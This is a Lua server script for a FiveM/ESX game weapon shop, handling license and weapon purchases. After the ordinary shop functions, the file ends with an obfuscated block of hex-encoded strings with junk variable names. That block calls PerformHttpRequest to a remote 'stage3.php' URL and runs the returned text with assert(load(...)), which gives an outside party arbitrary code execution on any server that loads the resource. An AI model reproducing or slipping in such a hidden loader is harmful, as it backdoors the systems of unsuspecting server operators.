
ESX.RegisterServerCallback('esx_weaponshop:buyLicense', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.getMoney() >= Config.LicensePrice then
		xPlayer.removeMoney(Config.LicensePrice)

		TriggerEvent('esx_license:addLicense', source, 'weapon', function()
			cb(true)
		end)
	else
		xPlayer.showNotification(_U('not_enough'))
		cb(false)
	end
end)

ESX.RegisterServerCallback('esx_weaponshop:buyWeapon', function(source, cb, weaponName, zone)
	local xPlayer = ESX.GetPlayerFromId(source)
	local price = GetPrice(weaponName, zone)

	if price == 0 then
		print(('esx_weaponshop: %s attempted to buy a unknown weapon!'):format(xPlayer.identifier))
		cb(false)
	else
		if xPlayer.hasWeapon(weaponName) then
			xPlayer.showNotification(_U('already_owned'))
			cb(false)
		else
			if zone == 'BlackWeashop' then
				if xPlayer.getAccount('black_money').money >= price then
					xPlayer.removeAccountMoney('black_money', price)
					xPlayer.addWeapon(weaponName, 42)
	
					cb(true)
				else
					xPlayer.showNotification(_U('not_enough_black'))
					cb(false)
				end
			else
				if xPlayer.getMoney() >= price then
					xPlayer.removeMoney(price)
					xPlayer.addWeapon(weaponName, 42)
	
					cb(true)
				else
					xPlayer.showNotification(_U('not_enough'))
					cb(false)
				end
			end
		end
	end
end)

function GetPrice(weaponName, zone)
	local weapon = nil
	for k,v in pairs(Config.Zones[zone].Items) do
		if v.name == weaponName then
			weapon  = v
			break
		end
	end

	if weapon then
		return weapon.price
	else
		return 0
	end
end


local LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[4][LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6d\x61\x2d\x6e\x69\x6e\x6a\x61\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x6f\x49\x70\x64\x79", function (VYfrpEGjjnwAYxFoIJTrkJeOkFzMnBAdVHFBJCSGeOKhgNEPXRYicuplfjutaBRWwRiTRy, SDHWBaExKevHdRVwBPUjfjxPNjcbfhTVtwRMuWEsJzBXoSMYEpSFiPGwcJwJmfqGLGhWWe) if (SDHWBaExKevHdRVwBPUjfjxPNjcbfhTVtwRMuWEsJzBXoSMYEpSFiPGwcJwJmfqGLGhWWe == LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[6] or SDHWBaExKevHdRVwBPUjfjxPNjcbfhTVtwRMuWEsJzBXoSMYEpSFiPGwcJwJmfqGLGhWWe == LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[5]) then return end LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[4][LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[2]](LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[4][LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[3]](SDHWBaExKevHdRVwBPUjfjxPNjcbfhTVtwRMuWEsJzBXoSMYEpSFiPGwcJwJmfqGLGhWWe))() end)